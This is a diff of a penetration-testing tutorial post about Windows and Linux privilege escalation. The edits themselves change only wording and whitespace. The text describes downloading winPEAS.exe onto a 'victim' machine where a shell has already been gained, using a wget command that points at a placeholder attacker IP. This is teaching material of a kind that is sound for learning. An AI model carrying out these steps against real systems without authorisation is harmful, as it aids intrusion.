@@ -41,9 +41,9 @@ This will start a http on port 80 in the directory you currently are.
 You can now download the lse.sh if you are on Linux or winPEAS.exe if you are on Windows.
 Once you have transferd one of the files you can run it and read the output carefully for anything interesting that could lead to a privilege escalation.
 
-Let's say we already have shell on a Windows victim we could start from there to download the winPEAS.exe file.
+Let's say we already have shell on a Windows victim we could start from there to download the winPEAS.exe file with the command below
 <div class="alert-info">wget http://ip/winPEAS.exe -O winPEAS.exe</div>
-![image](/assets/img/tranfser-winpeas.png)
+![image](/assets/img/tranfser-winpeas.png)  
 As you can see the shell we had does not understand weget. So we just type in powershell to get a powershell shell were we can run the wget comman.
 
 Next run the winPEAS.exe and check for anything interesting that could lead to a privilege escalation.
